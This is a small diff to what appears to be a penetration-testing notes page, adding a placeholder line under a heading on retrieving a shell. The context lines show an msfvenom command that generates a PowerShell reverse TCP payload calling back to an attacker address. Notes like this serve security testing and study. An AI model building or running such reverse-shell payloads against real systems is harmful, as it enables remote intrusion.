@@ -8,6 +8,8 @@
 
 #### Retrieving shell (without metasploit)
 
+... to test
+
 {% code overflow="wrap" %}
 ```sh
 $ msfvenom -p cmd/windows/powershell/powershell_reverse_tcp LHOST=<attacker_addr> LPORT=8888 -o <output>.cmd
